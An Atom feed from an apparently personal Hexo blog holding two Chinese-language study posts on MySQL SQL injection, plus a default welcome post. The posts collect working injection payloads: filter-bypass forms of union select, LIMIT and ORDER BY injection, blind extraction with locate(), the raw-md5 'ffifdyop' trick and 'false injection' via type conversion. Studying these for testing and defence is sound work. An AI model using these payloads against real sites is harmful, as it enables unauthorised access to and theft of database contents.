<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Alisita&#39;s blogs</title>
  <subtitle>一只准备考研的苦逼学生</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://alisitaweb.github.io/"/>
  <updated>2017-09-07T06:30:13.366Z</updated>
  <id>https://alisitaweb.github.io/</id>
  
  <author>
    <name>yuanbo</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>MySQL 一些注入技巧</title>
    <link href="https://alisitaweb.github.io/2017/09/07/MySQL-%E4%B8%80%E4%BA%9B%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7/"/>
    <id>https://alisitaweb.github.io/2017/09/07/MySQL-一些注入技巧/</id>
    <published>2017-09-07T06:29:07.000Z</published>
    <updated>2017-09-07T06:30:13.366Z</updated>
    
    <content type="html"><![CDATA[<h3 id="总结一下mysql中用的到的技巧"><a href="#总结一下mysql中用的到的技巧" class="headerlink" title="总结一下mysql中用的到的技巧"></a>总结一下mysql中用的到的技巧</h3><hr>
<p><strong>常量</strong>：true，false，null，\N，current_timestamp变量：@myvar:=1</p>
<p><strong>系统变量</strong>：@@version,@@datadir…..</p>
<p><strong>常用函数</strong>：version(),pi()(圆周率),pow(x,y)(返回X的Y次方,char(),substring()</p>
<p><strong>字符串生成</strong>：hex(),conv()(数字进制转换)</p>
<p><strong>有关于字符串生成的</strong>：true=1,floor(pi())=3,ceil(pi())=4,floor(version())=5,ceil(version())=6….</p>
<hr>
<h3 id="过滤的绕过"><a href="#过滤的绕过" class="headerlink" title="过滤的绕过"></a>过滤的绕过</h3><p> <em>空格</em>：%20, %09, %0a, %0b, %0c, %0d, %a0，还有一些可以利用括号或者注释  </p>
<p> <em>and，or</em>：||，&amp;&amp; </p>
<p> <em>union select</em>：<br> 利用括号，’and(true)like(false)union(select(pass)from(users))，<br> 方括号union [all|distinct] select pass from users#，  union%a0select pass from users，<br> 或者内联注释union/<em>&amp;sort=</em>/select pass from users#  </p>
<p> <em>union</em>：子查询进行盲注and length((select pass from users having substr(pass,1,1)=’a’))  </p>
<p> <em>having</em>：and(select substr(group_concat(pass),1,1)from users)=’a  </p>
<p> <em>select … from(过滤代码如/SELECT\s+[A-Za-z.]+\s+FROM/i/i)</em>：<br>select [all|distinct] pass from users  select<code>table_name</code>from<code>information_schema</code> . <code>tables</code><br>select pass as alias from users  select pass aliasalias from users<br>select pass<code>alias alias</code>from users  select+pass%a0from(users)  </p>
<p> <em>select,and,&amp;</em>：  这里就是可以利用上一篇文章中提到的false注入的方式进行绕过，具体见上文</p>
<p> <em>不使用逗号</em>：’ and substr(data from 1 for 1) = ‘a’#</p>
<h3 id="不同情境的注入技巧"><a href="#不同情境的注入技巧" class="headerlink" title="不同情境的注入技巧"></a>不同情境的注入技巧</h3><h4 id="like"><a href="#like" class="headerlink" title="like"></a>like</h4><p> 有时候可以利用一些逻辑语句进行注入<br> <code>if((select(left((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),3))like(0x2562)),name,price)</code></p>
<h4 id="Limit"><a href="#Limit" class="headerlink" title="Limit"></a>Limit</h4><p>  limit后面可以跟两个函数，PROCEDURE 和 INTO（需要写权限）<br>  利用PROCEDURE 有两种方式，基于报错和时间，参考文章<a href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html" target="_blank" rel="external">MySQL下Limit注入方法</a><br>  5.6以上好像不行了QAQ。。。。。<br>  基于报错<br>  <code>mysql&gt; SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</code></p>
<p>  基于时间<br>  <code>SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</code></p>
<h4 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h4><p> order by 后面的数字也可以作为一个注入点，参考文章<a href="https://www.secpulse.com/archives/57197.html" target="_blank" rel="external">MySQL Order By 注入总结</a><br> 这里就不多写了</p>
<h4 id="一些函数"><a href="#一些函数" class="headerlink" title="一些函数"></a>一些函数</h4><h5 id="不常用函数绕过滤"><a href="#不常用函数绕过滤" class="headerlink" title="不常用函数绕过滤"></a>不常用函数绕过滤</h5><p> <code>lpad(data,1,space(1))  // lpad(&#39;hi&#39;,4,&#39;?&#39;) = &#39;??hi&#39;</code><br> <code>rpad(data,1,space(1)) // rpad(&#39;hi&#39;,4,&#39;?&#39;) = &#39;hi??&#39;</code></p>
<h5 id="搜索匹配类的函数"><a href="#搜索匹配类的函数" class="headerlink" title="搜索匹配类的函数"></a>搜索匹配类的函数</h5><p> <code>&#39;-if(locate(&#39;f&#39;,data),1,0)#&#39;</code><br> <code>&#39;-if(locate(&#39;fo&#39;,data)1,0)#&#39;</code><br> <code>&#39;-if(locate(&#39;foo&#39;,data),1,0)#&#39;</code><br> <code>instr()</code><br> <code>position()</code></p>
<h5 id="使用函数进行字符串切割"><a href="#使用函数进行字符串切割" class="headerlink" title="使用函数进行字符串切割"></a>使用函数进行字符串切割</h5><p><code>length(trim(leading &#39;a&#39; from data))</code><br><code>length(replace(data,&#39;a&#39;,&#39;&#39;))</code></p>
<h4 id="关于PHP中md5的一个姿势"><a href="#关于PHP中md5的一个姿势" class="headerlink" title="关于PHP中md5的一个姿势"></a>关于PHP中md5的一个姿势</h4><p>例如，PHP中有这么一段SQL语句<br><code>$sql = &quot;select * from admin where pass = &#39;&quot;.md5($password,true).&quot;&#39;&quot;;</code><br>这里是可以注入的，关于PHP中md5函数<br>如果可选的raw_output被设置为TRUE，那么md5报文摘要将以16字节长度的原始二进制返回<br><strong>就是说找到一个字符串md5的二进制和字符编码中的某些编码对上，就会产生注入，这里贴出一个原文作者找到的字符串，ffifdyop,md5加密后对应的字符串是 <code>&#39;or&#39;&lt;trash&gt;</code></strong><br><a href="http://cvk.posthaven.com/sql-injection-with-raw-md5-hashes" target="_blank" rel="external">原文</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;总结一下mysql中用的到的技巧&quot;&gt;&lt;a href=&quot;#总结一下mysql中用的到的技巧&quot; class=&quot;headerlink&quot; title=&quot;总结一下mysql中用的到的技巧&quot;&gt;&lt;/a&gt;总结一下mysql中用的到的技巧&lt;/h3&gt;&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;常
    
    </summary>
    
      <category term="SQL Injection" scheme="https://alisitaweb.github.io/categories/SQL-Injection/"/>
    
    
      <category term="MySQL Injection" scheme="https://alisitaweb.github.io/tags/MySQL-Injection/"/>
    
  </entry>
  
  <entry>
    <title>MySQL False 注入姿势学习</title>
    <link href="https://alisitaweb.github.io/2017/09/06/MySQL-False%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%E5%AD%A6%E4%B9%A0/"/>
    <id>https://alisitaweb.github.io/2017/09/06/MySQL-False注入姿势学习/</id>
    <published>2017-09-06T13:43:32.552Z</published>
    <updated>2017-09-06T13:54:40.879Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://bobao.360.cn/learning/detail/3804.html" target="_blank" rel="external">原文链接</a></p>
<h3 id="0x01-False-Injection"><a href="#0x01-False-Injection" class="headerlink" title="0x01 False Injection"></a>0x01 False Injection</h3><p>首先是看了文章之后知道了一个MySQL的特性<br>    <code>select * from user where username=0;</code><br>    <img src="./images/1.png" alt="enter description here" title="1"></p>
<p>这条语句指向之后会返回所有值</p>
<p>   <code>select * from users where password=0;</code><br>   <img src="./images/2.png" alt="enter description here" title="2"></p>
<p> 这里涉及到了MySQL的隐式类型转换</p>
<p>  官方文档是这样写的：<br>      <em>The following rules describe how conversion occurs for comparison operations:</em></p>
<p><em>If one or both arguments are NULL, the result of the comparison is NULL, except for the NULL-safe &lt;=&gt; equality comparison operator. For NULL &lt;=&gt; NULL, the result is true. No conversion is needed.</em></p>
<p><em>If both arguments in a comparison operation are strings, they are compared as strings.</em></p>
<p><em>If both arguments are integers, they are compared as integers.</em></p>
<p><em>Hexadecimal values are treated as binary strings if not compared to a number.</em></p>
<p><em>If one of the arguments is a TIMESTAMP or DATETIME column and the other argument is a constant, the constant is converted to a timestamp before the comparison is performed. This is done to be more ODBC-friendly. Note that this is not done for the arguments to IN()! To be safe, always use complete datetime, date, or time strings when doing comparisons. For example, to achieve best results when using BETWEEN with date or time values, use CAST() to explicitly convert the values to the desired data type.</em></p>
<p><em>If one of the arguments is a decimal value, comparison depends on the other argument. The arguments are compared as decimal values if the other argument is a decimal or integer value, or as floating-point values if the other argument is a floating-point value.</em></p>
<p><em>In all other cases, the arguments are compared as floating-point (real) numbers</em></p>
<hr>
<p>大概意思就是：<br>    如果两个参数比较，有至少一个NULL，结果就是NULL，除了是用NULL&lt;=&gt;NULL 会返回1。不做类型转换</p>
<p>   两个参数都是字符串，按照字符串比较。不做类型转换</p>
<p>   两个参数都是整数，按照整数比较。不做类型转换</p>
<p>   如果不与数字进行比较，则将十六进制值视为二进制字符串。</p>
<p>   有一个参数是 TIMESTAMP 或 DATETIME，并且另外一个参数是常量，常量会被转换为时间戳</p>
<p>   有一个参数是 decimal 类型，如果另外一个参数是 decimal 或者整数，会将整数转换为 decimal 后进行比较，如果另外一个参数是浮点数，则会把 decimal 转换为浮点数进行比较</p>
<p>   所有其他情况下，两个参数都会被转换为浮点数再进行比较</p>
<p>最重要的是下面这句话，这是利用点：<br>    <strong>字符串和数字比较，需要将字符串转为浮点数，这很明显会转换失败</strong></p>
<p>那么，将字符串转换的时候会产生一个warning，转换的结果为0，但是如果字符串的开头是数字的时候会从数字部分截断，转换为数字，所以上面为什么会返回所有值就可以理解了。</p>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p><code>where username=&#39;&#39;+&#39;&#39;;</code><br><code>where username=&#39;&#39;-&#39;&#39;;</code><br><code>where username=&#39;&#39;*&#39;&#39;;</code><br><code>where username=&#39;&#39;/6;</code><br><code>where username=&#39;&#39;%1;</code><br><code>where username=&#39;&#39;&amp;0;</code><br><code>where username=&#39;&#39;|0;</code><br><code>where username=&#39;&#39;^0;</code></p>
<h6 id="移位操作"><a href="#移位操作" class="headerlink" title="移位操作"></a>移位操作</h6><p><code>&lt;&lt;0# &#39;&gt;&gt;0</code></p>
<h4 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h4><p><code>where username=&#39;&#39;=0&lt;=&gt;1;</code><br><code>where username=&#39;&#39;=0&lt;&gt;0;</code><br><code>where username=&#39;&#39;&gt;-1;</code></p>
<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p><code>&#39;+1 is not null#  &#39;in(-1,1)#  &#39;not in(1,0)#  &#39;like 1#  &#39;REGEXP 1#  &#39;BETWEEN 1 AND 1#  &#39;div 1#  &#39;xor 1#  &#39;=round(0,1)=&#39;1  &#39;&lt;&gt;ifnull(1,2)=&#39;1</code></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;http://bobao.360.cn/learning/detail/3804.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;原文链接&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;0x01-False-Injection&quot;&gt;&lt;a href
    
    </summary>
    
      <category term="SQL Injection" scheme="https://alisitaweb.github.io/categories/SQL-Injection/"/>
    
    
      <category term="MySQL Injection" scheme="https://alisitaweb.github.io/tags/MySQL-Injection/"/>
    
  </entry>
  
  <entry>
    <title>new article</title>
    <link href="https://alisitaweb.github.io/2017/09/05/new-article/"/>
    <id>https://alisitaweb.github.io/2017/09/05/new-article/</id>
    <published>2017-09-05T09:02:39.000Z</published>
    <updated>2017-09-05T09:02:39.457Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Test</title>
    <link href="https://alisitaweb.github.io/2017/09/05/hello-world/"/>
    <id>https://alisitaweb.github.io/2017/09/05/hello-world/</id>
    <published>2017-09-05T02:26:15.920Z</published>
    <updated>2017-09-05T09:03:45.103Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
    
    </summary>
    
    
  </entry>
  
</feed>
